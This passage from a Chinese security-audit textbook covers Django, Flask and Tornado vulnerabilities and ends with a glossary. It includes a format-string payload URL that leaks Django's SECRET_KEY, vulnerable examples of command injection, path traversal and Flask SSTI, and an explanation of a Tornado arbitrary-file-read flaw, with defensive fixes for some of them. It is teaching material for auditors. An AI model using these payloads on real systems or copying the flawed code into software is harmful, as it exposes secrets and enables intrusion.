输出了当前已登陆用户哈希过的密码。user是当前上下文中仅有的一个变量，也就是FORMat函数传入的user=request.user，Django中request.user是当前用户对象，该对象包含一个属性password即该用户密码。

\2. Django格式化字符串利用

通过Django框架中一些路径，最终读取到配置项。Django自带的应用“admin”的models.py中导入了当前网站的配置文件，只需要通过某种方式，找到Django默认应用admin的model，再通过这个model获取settings对象，进而获取数据库账号密码、Web加密密钥等信息，如图12-12所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image662.jpg)

图14-12 格式化字符串漏洞利用流程

下面给出利用的Payload：



http://localhost:8000/?email={user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY}



  利用后获取Django中的SECRET_KEY，如图14-13所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image664.jpg)

图14-13 漏洞利用图

\3. Django格式化字符串防御

Django框架中出现格式化字符串漏洞主要是由于其template使用了FORMat函数进行拼接，导致敏感信息被错误显示至前台页面。那有没有一种方法可以不适用FORMat拼接template呢？其可以使用render函数将value值通过Django框架内部template拼接，从而受到框架保护，抵御格式化字符串漏洞。

下面给出安全案例代码：



def view_right(req):

  if req.method == 'GET':

​    return render(req, 'FORMat.html')

  else:

​    template = req.POST.get('email')

​    **return render(req, 'FORMat.html' ,("value": template))**



### 14.2.6 Django中的其他漏洞

  1.命令执行漏洞

命令执行漏洞通常是调用Shell来实现一些功能，与审计其他语言的命令执行漏洞类似，Django中命令执行漏洞的审计方法同样需要对一些常见的敏感函数进行审计，其审计的危险函数包括：

exec()、eval()、os.system()、os.popen()、os.spaw*()、os.exec*()、os.open()、os.popen*()、commands.call()、commands.getoutput()、Popen*()

下面给出命令执行漏洞代码案例：



def store_uploaded_file(request):

  uploaded_file = request.POST.get(“filename”)

  upload_dir_path = “static/uploads”

  if not os.path.exists(upload_dir_path):

​    os.makedirs(upload_dir_path)

  **cmd = “mv”+uploaded_file+“ ”+“%s”%upload_dir_path**

**os.system(cmd)**

return ‘static/upload/%s’%uploaded_file



  上述代码由于未对参数cmd进行严格过滤，导致其可以通过修改参数uploaded_file的方式执行命令。

2.路径穿越漏洞

路径穿越漏洞通常是由于其未对路径参数进行严格的校验，从而导致任意文件下载、删除、写入等危害，常见的存在路径穿越的函数包括：open(user_input)、os.fdopen(user_input)。

下面给出路径穿越漏洞的案例代码：



if os.path.isfile(**path**):

  file = **open(path)**

  file.write(file.read())

  file.close()

else:

  file.write(‘hello world’)



上述代码未对path进行过滤，导致其存在路径穿越漏洞，从而读取任意文件。

## 14.3 Flask框架常见漏洞

### 14.3.1 Flask框架介绍

\1. Flask简介

相比于Django而言，虽然Flask不及Django框架应用广泛，但是Flask是最灵活的框架之一，这也是Flask受到开发者喜爱的原因。Flask是一个轻量级的可定制框架，使用Python语言编写，较其他同类型框架更为灵活、轻便、安全且容易上手。它可以很好地结合MVC模式进行开发，开发人员分工合作，小型团队在短时间内就可以完成功能丰富的中小型网站或Web服务的实现。另外，Flask还有很强的定制性，用户可以根据自己的需求来添加相应的功能，在保持核心功能简单的同时实现功能的丰富与扩展，其强大的插件库可以让用户实现个性化的网站定制，开发出功能强大的网站。

\2. Flask项目目录

一个Flask项目主要文件包括：static目录、templates目录、路由文件。

l static目录用来存放静态资源，例如：图片、JS、CSS文件等；

l templates目录用来存放模板文件；

l 路由文件是一个python文件，该文件名称可以由开发者决定，例如：server.py。

\3. Flask项目运行流程

（1）路由

Flask框架在运行时，要经过路由文件，下面给出index.py路由文件内容。



from flask import Flask,url_for,redirect,render_template,render_template_string,request

app = Flask(__name__)

**@app.route("/index/")**

**def test():**

  **return "Hello flask"** 

if __name__ == "__main__":

  app.run()



@app.route("/index/") 中，route装饰器的作用是将函数和url绑定起来，当运行该脚本后，用户访问http://127.0.0.1:5000/index就会返回Hello flask，这就是简单的flask框架运行。

（2）渲染

Flask有两种渲染方式：render_template()、render_template_string()。

render_template()主要用来渲染文件，render_template_string()主要用来渲染字符串。渲染的模板一般是网站根目录templates文件夹下的html文件，其中传入的参数需要每个用户根据需求动态传入。

l render_template()函数案例

在templates/index.html设定两个动态传递的参数，分别是user.name和title，代码如下：



<html>

 <head>

  <title>**{{title}}** - 小猪佩奇</title>

 </head>

 <body>

   <h1>Hello, **{{user.name}}**!</h1>

 </body>

</html>



下面给出app.py文件的内容，其向上述的index.html中渲染动态变量。



@app.route('/index')#我们访问/或者/index都会跳转

def index():

  **user = {'name': '****小猪佩奇'}**#传入一个字典数组

  return **render_template**("index.html",**title='Home',user=user**)



访问http://127.0.0.1:5000就会自动加载templates/index.html，如图14-14所示。

![https://xzfile.aliyuncs.com/media/upload/picture/20181221165143-a425c5c4-04fd-1.png](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image666.gif)

图14-14 render_template案例首页

l 其他案例



@app.route("/index/")

def test():

  html = "test by gurenmeng"

  return **render_template("index.html", content=html)**

//templates/index.html

<p3>**{{content}}**</p3>



访问 http://127.0.0.1:5000/index 就会自动加载templates/index.html，将html这个参数内容传递给content这个变量，然后渲染到web页面，页面就会输出 test by gurenmeng，如图14-15所示。

![https://img-blog.csdnimg.cn/20190121192343552.png](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image668.gif)

图14-15 其他案例首页

### 12.3.2   Flask中SSTI漏洞

1.SSTI漏洞介绍

SSTI注入又称服务器端模板注入攻击(Server-Side Template Injection，SSTI)，与SQL注入一样，其也是由于接受用户输入而造成的安全问题。它的实质就是服务器端接受了用户的输入，没有经过过滤或者说过滤不严谨，将用户输入作为Web应用模板的一部分，但是在进行编译渲染的过程中，执行了用户输入的恶意代码、信息泄露、代码执行、getshell等问题。

该安全问题主要出现在web应用模板渲染的过程中，目前比较流行的渲染引擎模板主要有：smarty、twig、jinja2、freemarker、velocity等，而python中的Flask主要就是使用的jinja2来作为渲染模板，其主要包括三种语法：

l {% %}：控制结构；

l {{ }}：变量取值；

l {# #}：注释。

下面给出Flask框架中SSTI漏洞案例代码。



**code** = request.args.get('**ssti**')

  html = '''

​    <h1>qing -SSIT</h1>

​    <h2>The ssti is </h2>

​      <h3>**%s**</h3>

​    ''' % (**code**)

  return render_template_string(html)



开发者在程序设计时为了省事并不写一个html文件，而是直接当字符串来渲染。并且传递的参数ssti是可控的，从而导致用户可直接通过URL将参数渲染至前台页面，这就是Flask中SSTI注入的成因。

上述代码传递变量ssti将变量动态输出到%s上，然后经过render_template_string渲染至模板，由于对用户输入的值没有进行严格的过滤，导致JS代码被注入到模板并执行弹窗。

访问http://127.0.0.1:5000/qing?ssti=<script>alert(/qing/)</script>将JS代码注入到模板中执行弹窗，如图14-16所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image670.jpg)

图14-16 SSTI前台页面

2.SSTI漏洞防御

下面给出Flask框架中SSTI漏洞案例代码。



**code** = request.args.get('ssti')

  html = '''

​    <h1>qing -SSIT</h1>

​    <h2>The ssti is </h2>

​      <h3>**{{code}}**</h3>

​    ''' 

  return render_template_string(html)



将template 中的”’<h3> %s!</h3>”’%code改为”’<h3>{{code}}</h3>”’，这样，Jinja2在模板渲染的时候将request.url的值替换掉{{code}}, 而不会对code内容进行二次渲染这样即使code中含有{{}}也不会进行渲染，而只是把它当做普通字符串

## 14.4 Tornado框架常见漏洞

### 14.4.1 Tornado框架介绍

1.Tornado简介

Tornado 是一个Python Web框架和异步网络库，通过使用非阻塞网络I/O，Tornado可以支持上万级的连接，处理长连接、 WebSockets和其他需要与每个用户保持长久连接的应用。

与其他Python Web框架相比，Torando具有很多优势：

l 轻量级Web框架；

l 异步非阻塞IO处理方式；

l 出色的抗负载能力；

l 优异的处理性能，不依赖多线程，一定程度上解决C10K问题；

l WSGI全栈替代产品，推荐同时使用其Web框架和HTTP服务器。

\2. Tornado安装

Tornado框架的安装与其他的Python编写的Web框架类似，其主要分为手动安装与自动安装两种。

l 自动安装

  通过pip方式自动安装Tornado框架，使用命令如下：



pip install tornado



l 手动安装

从官网下载Tornado安装包，手动执行python安装脚本进行安装，使用命令如下：



$ curl -L -O https://github.com/facebook/tornado/archive/v3.1.0.tar.gz

$ tar xvzf v3.1.0.tar.gz

$ cd tornado-3.1.0

$ python setup.py build

$ sudo python setup.py install



\3. Tornado目录结构

一个简单的Tornado项目目录与其他的Web框架目录类似，都遵循MVC模式进行设计。Tornado的目录结构主要包括：controller、models、views。

l Controller：Web程序控制层，其用来处理程序的逻辑业务；

l Models：Web程序模块层，其用来定义程序的抽象类；

l Views：Web程序视图层，其用来定义程序的HTML视图。

除此之外，Web应用程序最外层都存在一个调用程序，其主要用来对外提供程序调用的主入口，下图14-17为Tornado项目的简单目录结构。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image672.jpg)

图14-17 Tornado目录结构图

\4. Tornado案例

Tornado框架编写的一个Web服务器代码，在浏览器输入127.0.0.1:8080/index， 就会得到包含‘home page’字符的网页。



\#coding:utf-8

import tornado.ioloop

import tornado.web

from controllers.login import LoginHandler

class **MainHandler**(tornado.web.RequestHandler):  

  def **get**(self, *args, **kwargs):

​    self.write('home page')

def **make_app():**

  **# tornado.web.Application([(网址1),(网址2)]) 根据路径修改网址内容**

  return tornado.web.Application([

  **(r'/index',MainHandler),**

  **(r'/login',LoginHandler),**

])

if __name__ == '__main__':

  app = **make_app()**

app.listen(8080)    #监听端口号

  tornado.ioloop.IOLoop.instance().start() #开启服务器



上面将所有代码写在了一个代码文件中，开发者也可以利用MVC设计方式分开编写。将处理‘/login’请求的类LoginHandler放在controllers文件夹下，将视图文件login.html放在views文件夹下（需要配置‘template_path’）,而models文件夹下可以存放和数据库处理相关的代码，statics中存放静态文件，如css、js等，需要配置路径：'static_path':'statics'。

### 14.4.2 Tornado中任意文件读取漏洞

1.Tornado读取静态文件

Tornado是一个全异步的框架，该框架支持两种读取静态文件的方式：文件控制器读取、setting中指定静态路径。

（1）StaticFileHandler读取文件

该框架中存在一个专门处理静态文件的控制器——StaticFileHandler。程序开发时，只要指定一个目录对应到该控制器中，即可在HTTP请求中直接请求到该目录下的文件，如图14-18所示

![https://wooyun.x10sec.org/static/bugs/full/b856f47b9415fbc3859e5d23b0ac993fc6bda844.jpg](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image674.jpg)

图14-18 StaticFileHandler解释

  （2）setting配置静态目录

Tornado框架还支持在setting中直接指定static_path参数，说明静态文件存放在哪个目录下，如下代码：



import tornado.webclass MainHandler(tornado.web.RequestHandler):

  def get(self):

​    self.write("Hello, world")if __name__ == "__main__":

  **setting** = {

​    "debug": True,

​    **"static_path": "/Users/phithon/pro/python/wooyun/tornado-file-read/static/",**

  }application = tornado.web.Application([

​    (r"/", MainHandler),

  ], **setting)

  application.listen(8888)

  **.**.**.**loop.IOLoop.instance().start()



上述代码指定可读取的静态文件目录为/Users/phithon/pro/python/wooyun/tornado-file-read/static/，当我们直接请求到该目录下的01.txt静态文件，显示的页面如图14-19所示。

![https://wooyun.x10sec.org/static/bugs/full/de8404cda2a6589cc5770d9c138c67395e6efcda.jpg](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image676.jpg)

图14-19 查看静态文件图

当攻击者尝试发送请求访问该服务器static目录外的文件/etc/passwd时，则会抛出HTTP 403禁止访问异常，如图14-20所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image678.jpg)

图14-20 正常报错图

2.Tornado读取任意文件漏洞分析

Tornado框架中对读取静态文件路径是否合法处存在漏洞，攻击者可通过该漏洞实现任意文件读取，下面给出Tornado框架判定路径合法的源代码，并对其进行漏洞分析。



def validate_absolute_path(self, root, absolute_path):

​    **root = os.path.abspath(root)**

​    **if not (absolute_path + os.path.sep).startswith(root):**

​      raise HTTPError(403, "%s is not in root static directory",self.path)

​    if (os.path.isdir(absolute_path) and

​        self.default_filename is not None):

​      if not self.request.path.endswith("/"):

​        self.redirect(self.request.path + "/", permanent=True)

​        return

​      absolute_path = os.path.join(absolute_path, self.default_filename)

​    if not os.path.exists(absolute_path):

​      raise HTTPError(404)

​    if not os.path.isfile(absolute_path):

​      raise HTTPError(403, "%s is not a file", self.path)

​    return absolute_path



关键代码是root = os.path.abspath(root)，if not (absolute_path + os.path.sep).startswith(root):os.path.abspath获取root变量指定的绝对路径。

root实际上是程序中setting的“static_path”，该参数指定静态文件目录的绝对路径。但在python中，os.path.abspath函数获得的路径结尾不存在符号“/”。例如：传入的路径是“/Users/phithon/pro/python/wooyun/tornado-file-read/static/”，经过os.path.abspath函数处理，路径变为“/Users/phithon/pro/python/wooyun/tornado-file-read/static”。

上述源代码会对请求的静态文件路径进行判断，不以root开头则会提示403错误。因为Pathon程序在root这个变量是没有“/“的，那么如果我有一个文件是“/Users/phithon/pro/python/wooyun/tornado-file-read/static.db”，或一个目录是“/Users/phithon/pro/python/wooyun/tornado-file-read/static_private/”，那就都是以“/Users/phithon/pro/python/wooyun/tornado-file-read/static”开头的，但这些文件并不在static这个目录下，所以并没有触发403错误。

这种情况下造成了文件读取漏洞，攻击者读取到了本不应该被读取的某些文件，从而造成了文件读取漏洞，在特殊情况下，如果开发者指定的静态目录为test，那么就可以读取所有test上层的目录下的名字开头为test的文件、目录。

假设某Tornado程序中有一个数据库叫static_private.sqlite3，有个目录叫static_private，里面放着敏感信息私钥private.key，攻击者可以使用该漏洞读取该私钥的内容，如图14-21所示。

![img](file:///C:/Users/ADMINI~1/AppData/Local/Temp/msohtmlclip1/01/clip_image680.jpg)

图14-21 文件读取利用图

## 14.5 单元小结

本单元主要学习了代码审计中的Python框架审计部分，分别包括：Python框架代码审计的入门知识、Django框架审计的常见漏洞（SQL注入漏洞、XSS漏洞、CSRF漏洞、其他漏洞），然后对Flask框架和Tornado框架的基础知识、SSTI漏洞、任意文件读取漏洞进行介绍。通过对常见框架漏洞案例进行列举，使读者熟悉常见的Python框架漏洞的审计方法。



 

# 术语表

\1.  CMS：CMS指的是内容管理系统，它具有很多基于模板的优秀设计，从而增加网站建设的速度并减少开发成本，是现在很多企业和个人在做网站建设的首选方法。

\2.  ISO8859、UTF-8、GB2312、GBK：计算机常见的编码方式，是信息在计算机中的一种表现形式。

\3.  Php.ini：PHP编程语言环境的配置文件，可用于配置PHP部分功能的开启与关闭。

\4.  Boolean：指的是一种数据类型。Boolean变量存储为8位（1个字节）的数值形式，其只能是True 或是 False。

\5.  键值对：在计算机科学中，键值对是一种在计算系统和应用程序中的基本数据表示形式。数据模型将表示为元组的集合<name，value>，name为成为键、value称为值。

\6.  XML：可扩展标记语言，标准通用标记语言的子集，简称XML。其是一种用于标记电子文件使其具有结构性的标记语言。

\7.  URL：统一资源定位系统（uniform resource locator，URL）是因特网的万维网服务程序上用于指定信息位置的表示方法。

\8.  Payload：中文“有效载荷”，指成功利用系统漏洞之后，真正在目标系统执行的代码或指令。

\9.  Token验证：Token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个Token便将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据即可，无需再次带上用户名和密码。

\10. Web后门：Web后门就以asp、php、jsp或者cgi等网页文件形式存在的一种Web命令执行环境，也可以将其称做为一种网页后门。

\11. cmd指令：是一种命令提示符，cmd是command的缩写，即命令提示符（cmd）。

\12. bash指令：bash(GNU Bourne-Again Shell)是大多数Linux系统默认的shell程序，是一个为GNU计划编写的Unix shell。

\13. Session：在计算机中称为“会话控制”。Session对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的Web页之间跳转时，存储在Session对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。

\14. CI框架：CI全称为“CodeIgniter”，它是一个小巧但功能强大的PHP框架，是一个简单的工具包，适合开发者们建立功能完善的Web应用程序。

 